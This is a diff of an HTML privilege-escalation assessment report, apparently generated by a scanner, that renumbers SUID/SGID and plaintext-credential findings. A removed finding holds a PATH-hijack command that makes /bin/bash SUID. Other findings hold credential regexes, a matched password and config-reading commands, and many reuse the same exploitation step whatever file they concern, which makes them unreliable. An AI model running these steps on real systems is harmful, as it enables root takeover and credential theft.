@@ -286,20 +286,20 @@
         <div class="header">
             <h1>Privilege Escalation Vulnerability Assessment</h1>
             <p>Confidential Security Report</p>
-            <p>Generated: 2025-03-14 11:53:45</p>
+            <p>Generated: 2025-03-17 14:57:01</p>
         </div>
         
         <div class="section">
             <div class="section-header">Executive Summary</div>
             <div class="section-content">
                 <div class="executive-summary">
-                    <p>This report presents the findings of a comprehensive privilege escalation assessment conducted on the target system. The assessment identified 62 potential privilege escalation vectors, of which 21 have been verified as exploitable. This report provides detailed information about each vulnerability and recommended remediation actions.</p>
+                    <p>This report presents the findings of a comprehensive privilege escalation assessment conducted on the target system. The assessment identified 60 potential privilege escalation vectors, of which 11 have been verified as exploitable. This report provides detailed information about each vulnerability and recommended remediation actions.</p>
                 </div>
                 
                 <div class="risk-summary">
                     <div class="risk-box risk-high">
                         <h3>High Risk</h3>
-                        <div class="count">36</div>
+                        <div class="count">35</div>
                         <p>Critical vulnerabilities requiring immediate attention</p>
                     </div>
                     <div class="risk-box risk-medium">
@@ -309,7 +309,7 @@
                     </div>
                     <div class="risk-box risk-low">
                         <h3>Low Risk</h3>
-                        <div class="count">13</div>
+                        <div class="count">12</div>
                         <p>Minor vulnerabilities to address in regular maintenance</p>
                     </div>
                 </div>
@@ -565,8 +565,8 @@
             </tr>
 <tr>
                 <td>VULN-036</td>
-                <td>Suid Binary</td>
-                <td class="severity-high">High</td>
+                <td>Sgid Binary</td>
+                <td class="severity-medium">Medium</td>
                 <td>Unexploitable</td>
             </tr>
 <tr>
@@ -597,13 +597,13 @@
                 <td>VULN-041</td>
                 <td>Sgid Binary</td>
                 <td class="severity-medium">Medium</td>
-                <td>Unexploitable</td>
+                <td>Exploitable</td>
             </tr>
 <tr>
                 <td>VULN-042</td>
                 <td>Sgid Binary</td>
                 <td class="severity-medium">Medium</td>
-                <td>Exploitable</td>
+                <td>Unexploitable</td>
             </tr>
 <tr>
                 <td>VULN-043</td>
@@ -627,25 +627,25 @@
                 <td>VULN-046</td>
                 <td>Sgid Binary</td>
                 <td class="severity-medium">Medium</td>
-                <td>Unexploitable</td>
+                <td>Exploitable</td>
             </tr>
 <tr>
                 <td>VULN-047</td>
-                <td>Sgid Binary</td>
-                <td class="severity-medium">Medium</td>
+                <td>Plaintext Credentials</td>
+                <td class="severity-low">Low</td>
                 <td>Exploitable</td>
             </tr>
 <tr>
                 <td>VULN-048</td>
-                <td>World Writable Directory</td>
+                <td>Plaintext Credentials</td>
                 <td class="severity-low">Low</td>
-                <td>Unexploitable</td>
+                <td>Exploitable</td>
             </tr>
 <tr>
                 <td>VULN-049</td>
-                <td>World Writable Directory</td>
+                <td>Plaintext Credentials</td>
                 <td class="severity-low">Low</td>
-                <td>Unexploitable</td>
+                <td>Exploitable</td>
             </tr>
 <tr>
                 <td>VULN-050</td>
@@ -691,39 +691,27 @@
             </tr>
 <tr>
                 <td>VULN-057</td>
-                <td>Plaintext Credentials</td>
-                <td class="severity-low">Low</td>
-                <td>Exploitable</td>
-            </tr>
-<tr>
-                <td>VULN-058</td>
-                <td>Plaintext Credentials</td>
-                <td class="severity-low">Low</td>
-                <td>Exploitable</td>
-            </tr>
-<tr>
-                <td>VULN-059</td>
-                <td>Plaintext Credentials</td>
-                <td class="severity-low">Low</td>
-                <td>Exploitable</td>
-            </tr>
-<tr>
-                <td>VULN-060</td>
                 <td>Writable Path Directory</td>
                 <td class="severity-low">Low</td>
                 <td>Exploitable</td>
             </tr>
 <tr>
-                <td>VULN-061</td>
+                <td>VULN-058</td>
                 <td>Path Hijacking</td>
                 <td class="severity-medium">Medium</td>
                 <td>Exploitable</td>
             </tr>
 <tr>
-                <td>VULN-062</td>
+                <td>VULN-059</td>
                 <td>Path Hijacking</td>
                 <td class="severity-medium">Medium</td>
                 <td>Exploitable</td>
+            </tr>
+<tr>
+                <td>VULN-060</td>
+                <td>History File Exposure</td>
+                <td class="severity-low">Low</td>
+                <td>Unexploitable</td>
             </tr>
 
                 </table>
@@ -743,7 +731,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/etc/alternatives/rsh</div>
+                    <div class="detail-value">/etc/alternatives/rlogin</div>
                 </div>
                 
                 <div class="detail-row">
@@ -778,7 +766,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/etc/alternatives/rlogin</div>
+                    <div class="detail-value">/etc/alternatives/rsh</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1198,7 +1186,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/mount</div>
+                    <div class="detail-value">/usr/bin/fusermount3</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1233,7 +1221,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/fusermount3</div>
+                    <div class="detail-value">/usr/bin/rlogin</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1268,7 +1256,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/gpasswd</div>
+                    <div class="detail-value">/usr/bin/fusermount</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1303,7 +1291,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/rlogin</div>
+                    <div class="detail-value">/usr/bin/gpasswd</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1373,7 +1361,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/fusermount</div>
+                    <div class="detail-value">/usr/bin/sg</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1408,7 +1396,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/sg</div>
+                    <div class="detail-value">/usr/bin/su</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1443,7 +1431,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/su</div>
+                    <div class="detail-value">/usr/bin/newgrp</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1478,7 +1466,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/sudo</div>
+                    <div class="detail-value">/usr/bin/umount</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1548,7 +1536,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/newgrp</div>
+                    <div class="detail-value">/usr/bin/chsh</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1583,7 +1571,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/sbin/umount.nfs4</div>
+                    <div class="detail-value">/usr/bin/sudo</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1618,7 +1606,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/sbin/mount.nfs</div>
+                    <div class="detail-value">/usr/sbin/umount.nfs</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1653,7 +1641,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/chsh</div>
+                    <div class="detail-value">/usr/sbin/mount.nfs</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1688,7 +1676,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/sbin/mount.nfs4</div>
+                    <div class="detail-value">/usr/bin/passwd</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1723,7 +1711,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/umount</div>
+                    <div class="detail-value">/usr/sbin/mount.smb3</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1758,7 +1746,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/sbin/mount.smb3</div>
+                    <div class="detail-value">/usr/sbin/mount.ntfs-3g</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1793,7 +1781,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/sbin/umount.nfs</div>
+                    <div class="detail-value">/usr/sbin/mount.nfs4</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1828,7 +1816,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/passwd</div>
+                    <div class="detail-value">/usr/sbin/umount.nfs4</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1863,7 +1851,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/sbin/mount.ntfs-3g</div>
+                    <div class="detail-value">/usr/sbin/mount.ntfs</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1898,7 +1886,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/sbin/mount.ntfs</div>
+                    <div class="detail-value">/usr/sbin/mount.cifs</div>
                 </div>
                 
                 <div class="detail-row">
@@ -1959,44 +1947,9 @@
                 </div>
             </div>
             
-            <div class="finding finding-high">
-                <div class="finding-header">
-                    VULN-036: Suid Binary
-                    <span>High Risk</span>
-                </div>
-                <div class="finding-content">
-            
-                <div class="detail-row">
-                    <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/sbin/mount.cifs</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Owner:</div>
-                    <div class="detail-value">root</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Group:</div>
-                    <div class="detail-value">root</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Permissions:</div>
-                    <div class="detail-value">4755</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Exploit Method:</div>
-                    <div class="detail-value"></div>
-                </div>
-                
-                </div>
-            </div>
-            
             <div class="finding finding-medium">
                 <div class="finding-header">
-                    VULN-037: Sgid Binary
+                    VULN-036: Sgid Binary
                     <span>Medium Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2026,7 +1979,7 @@
             
             <div class="finding finding-medium">
                 <div class="finding-header">
-                    VULN-038: Sgid Binary
+                    VULN-037: Sgid Binary
                     <span>Medium Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2056,7 +2009,7 @@
             
             <div class="finding finding-medium">
                 <div class="finding-header">
-                    VULN-039: Sgid Binary
+                    VULN-038: Sgid Binary
                     <span>Medium Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2086,7 +2039,7 @@
             
             <div class="finding finding-medium">
                 <div class="finding-header">
-                    VULN-040: Sgid Binary
+                    VULN-039: Sgid Binary
                     <span>Medium Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2116,7 +2069,7 @@
             
             <div class="finding finding-medium">
                 <div class="finding-header">
-                    VULN-041: Sgid Binary
+                    VULN-040: Sgid Binary
                     <span>Medium Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2146,7 +2099,7 @@
             
             <div class="finding finding-medium">
                 <div class="finding-header">
-                    VULN-042: Sgid Binary
+                    VULN-041: Sgid Binary
                     <span>Medium Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2164,6 +2117,41 @@
                 <div class="detail-row">
                     <div class="detail-label">Group:</div>
                     <div class="detail-value">_ssh</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Permissions:</div>
+                    <div class="detail-value">2755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Potentially exploitable based on basic checks</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-medium">
+                <div class="finding-header">
+                    VULN-042: Sgid Binary
+                    <span>Medium Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/usr/bin/locate</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Owner:</div>
+                    <div class="detail-value">root</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Group:</div>
+                    <div class="detail-value">plocate</div>
                 </div>
                 
                 <div class="detail-row">
@@ -2201,6 +2189,11 @@
                     <div class="detail-value">2755</div>
                 </div>
                 
+                <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Potentially exploitable based on basic checks</div>
+                </div>
+                
                 </div>
             </div>
             
@@ -2213,7 +2206,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/sbin/unix_chkpwd</div>
+                    <div class="detail-value">/usr/bin/crontab</div>
                 </div>
                 
                 <div class="detail-row">
@@ -2223,12 +2216,17 @@
                 
                 <div class="detail-row">
                     <div class="detail-label">Group:</div>
-                    <div class="detail-value">shadow</div>
+                    <div class="detail-value">crontab</div>
                 </div>
                 
                 <div class="detail-row">
                     <div class="detail-label">Permissions:</div>
                     <div class="detail-value">2755</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Potentially exploitable based on basic checks</div>
                 </div>
                 
                 </div>
@@ -2261,6 +2259,11 @@
                     <div class="detail-value">2755</div>
                 </div>
                 
+                <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Potentially exploitable based on basic checks</div>
+                </div>
+                
                 </div>
             </div>
             
@@ -2273,7 +2276,7 @@
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/locate</div>
+                    <div class="detail-value">/usr/sbin/unix_chkpwd</div>
                 </div>
                 
                 <div class="detail-row">
@@ -2283,7 +2286,7 @@
                 
                 <div class="detail-row">
                     <div class="detail-label">Group:</div>
-                    <div class="detail-value">plocate</div>
+                    <div class="detail-value">shadow</div>
                 </div>
                 
                 <div class="detail-row">
@@ -2291,34 +2294,9 @@
                     <div class="detail-value">2755</div>
                 </div>
                 
-                </div>
-            </div>
-            
-            <div class="finding finding-medium">
-                <div class="finding-header">
-                    VULN-047: Sgid Binary
-                    <span>Medium Risk</span>
-                </div>
-                <div class="finding-content">
-            
                 <div class="detail-row">
-                    <div class="detail-label">Path:</div>
-                    <div class="detail-value">/usr/bin/crontab</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Owner:</div>
-                    <div class="detail-value">root</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Group:</div>
-                    <div class="detail-value">crontab</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Permissions:</div>
-                    <div class="detail-value">2755</div>
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Potentially exploitable based on basic checks</div>
                 </div>
                 
                 </div>
@@ -2326,41 +2304,47 @@
             
             <div class="finding finding-low">
                 <div class="finding-header">
-                    VULN-048: World Writable Directory
+                    VULN-047: Plaintext Credentials
                     <span>Low Risk</span>
                 </div>
                 <div class="finding-content">
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/tmp</div>
+                    <div class="detail-value">/etc/unicornscan/modules.conf</div>
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Owner:</div>
-                    <div class="detail-value">root</div>
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Group:</div>
-                    <div class="detail-value">root</div>
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>scanit! host=localhost dbname=scan</li>
+<li>scanit!</li>
+</ul></div>
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Permissions:</div>
-                    <div class="detail-value">1777</div>
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)password\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['scanit! host=localhost dbname=scan', 'scanit!']}</li>
+<li>{'pattern': '(?i)username\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['scan']}</li>
+</ul></div>
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Is Critical:</div>
-                    <div class="detail-value">False</div>
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
                 </div>
                 
                 <div class="detail-row">
                     <div class="detail-label">Exploitation:</div>
                     <div class="detail-value">
-                        <p>Create a malicious cat binary in /tmp to make /bin/bash SUID</p>
-                        <div class="code-block">echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/cat && chmod +x /tmp/cat</div>
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
                     </div>
                 </div>
                 
@@ -2369,41 +2353,47 @@
             
             <div class="finding finding-low">
                 <div class="finding-header">
-                    VULN-049: World Writable Directory
+                    VULN-048: Plaintext Credentials
                     <span>Low Risk</span>
                 </div>
                 <div class="finding-content">
             
                 <div class="detail-row">
                     <div class="detail-label">Path:</div>
-                    <div class="detail-value">/tmp/.ICE-unix</div>
+                    <div class="detail-value">/etc/idmapd.conf</div>
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Owner:</div>
-                    <div class="detail-value">root</div>
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Group:</div>
-                    <div class="detail-value">root</div>
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>nobody
+Nobody-Group = nogroup
+</li>
+</ul></div>
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Permissions:</div>
-                    <div class="detail-value">1777</div>
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['nobody\nNobody-Group = nogroup\n']}</li>
+</ul></div>
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Is Critical:</div>
-                    <div class="detail-value">False</div>
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
                 </div>
                 
                 <div class="detail-row">
                     <div class="detail-label">Exploitation:</div>
                     <div class="detail-value">
-                        <p>Create a malicious cat binary in /tmp to make /bin/bash SUID</p>
-                        <div class="code-block">echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/cat && chmod +x /tmp/cat</div>
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
                     </div>
                 </div>
                 
@@ -2412,7 +2402,7 @@
             
             <div class="finding finding-low">
                 <div class="finding-header">
-                    VULN-050: Plaintext Credentials
+                    VULN-049: Plaintext Credentials
                     <span>Low Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2447,10 +2437,15 @@ requestFile =
                 </div>
                 
                 <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
+                </div>
+                
+                <div class="detail-row">
                     <div class="detail-label">Exploitation:</div>
                     <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
                     </div>
                 </div>
                 
@@ -2459,7 +2454,7 @@ requestFile =
             
             <div class="finding finding-low">
                 <div class="finding-header">
-                    VULN-051: Plaintext Credentials
+                    VULN-050: Plaintext Credentials
                     <span>Low Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2489,10 +2484,15 @@ requestFile =
                 </div>
                 
                 <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
+                </div>
+                
+                <div class="detail-row">
                     <div class="detail-label">Exploitation:</div>
                     <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
                     </div>
                 </div>
                 
@@ -2501,49 +2501,7 @@ requestFile =
             
             <div class="finding finding-low">
                 <div class="finding-header">
-                    VULN-052: Plaintext Credentials
-                    <span>Low Risk</span>
-                </div>
-                <div class="finding-content">
-            
-                <div class="detail-row">
-                    <div class="detail-label">Path:</div>
-                    <div class="detail-value">/etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Pattern:</div>
-                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Matches:</div>
-                    <div class="detail-value"><ul>
-<li>root</li>
-</ul></div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Creds Data:</div>
-                    <div class="detail-value"><ul>
-<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['root']}</li>
-</ul></div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Exploitation:</div>
-                    <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
-                    </div>
-                </div>
-                
-                </div>
-            </div>
-            
-            <div class="finding finding-low">
-                <div class="finding-header">
-                    VULN-053: Plaintext Credentials
+                    VULN-051: Plaintext Credentials
                     <span>Low Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2573,10 +2531,15 @@ requestFile =
                 </div>
                 
                 <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
+                </div>
+                
+                <div class="detail-row">
                     <div class="detail-label">Exploitation:</div>
                     <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
                     </div>
                 </div>
                 
@@ -2585,7 +2548,56 @@ requestFile =
             
             <div class="finding finding-low">
                 <div class="finding-header">
-                    VULN-054: Plaintext Credentials
+                    VULN-052: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/var/lib/ucf/cache/:etc:idmapd.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>nobody
+Nobody-Group = nogroup
+</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['nobody\nNobody-Group = nogroup\n']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-053: Plaintext Credentials
                     <span>Low Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2617,10 +2629,15 @@ requestFile =
                 </div>
                 
                 <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
+                </div>
+                
+                <div class="detail-row">
                     <div class="detail-label">Exploitation:</div>
                     <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
                     </div>
                 </div>
                 
@@ -2629,95 +2646,7 @@ requestFile =
             
             <div class="finding finding-low">
                 <div class="finding-header">
-                    VULN-055: Plaintext Credentials
-                    <span>Low Risk</span>
-                </div>
-                <div class="finding-content">
-            
-                <div class="detail-row">
-                    <div class="detail-label">Path:</div>
-                    <div class="detail-value">/etc/unicornscan/modules.conf</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Pattern:</div>
-                    <div class="detail-value">(?i)password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Matches:</div>
-                    <div class="detail-value"><ul>
-<li>scanit! host=localhost dbname=scan</li>
-<li>scanit!</li>
-</ul></div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Creds Data:</div>
-                    <div class="detail-value"><ul>
-<li>{'pattern': '(?i)password\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['scanit! host=localhost dbname=scan', 'scanit!']}</li>
-<li>{'pattern': '(?i)username\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['scan']}</li>
-</ul></div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Exploitation:</div>
-                    <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
-                    </div>
-                </div>
-                
-                </div>
-            </div>
-            
-            <div class="finding finding-low">
-                <div class="finding-header">
-                    VULN-056: Plaintext Credentials
-                    <span>Low Risk</span>
-                </div>
-                <div class="finding-content">
-            
-                <div class="detail-row">
-                    <div class="detail-label">Path:</div>
-                    <div class="detail-value">/etc/idmapd.conf</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Pattern:</div>
-                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Matches:</div>
-                    <div class="detail-value"><ul>
-<li>nobody
-Nobody-Group = nogroup
-</li>
-</ul></div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Creds Data:</div>
-                    <div class="detail-value"><ul>
-<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['nobody\nNobody-Group = nogroup\n']}</li>
-</ul></div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Exploitation:</div>
-                    <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
-                    </div>
-                </div>
-                
-                </div>
-            </div>
-            
-            <div class="finding finding-low">
-                <div class="finding-header">
-                    VULN-057: Plaintext Credentials
+                    VULN-054: Plaintext Credentials
                     <span>Low Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2761,10 +2690,15 @@ netgroup:       nis
                 </div>
                 
                 <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
+                </div>
+                
+                <div class="detail-row">
                     <div class="detail-label">Exploitation:</div>
                     <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
                     </div>
                 </div>
                 
@@ -2773,7 +2707,54 @@ netgroup:       nis
             
             <div class="finding finding-low">
                 <div class="finding-header">
-                    VULN-058: Plaintext Credentials
+                    VULN-055: Plaintext Credentials
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>root</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Creds Data:</div>
+                    <div class="detail-value"><ul>
+<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['root']}</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
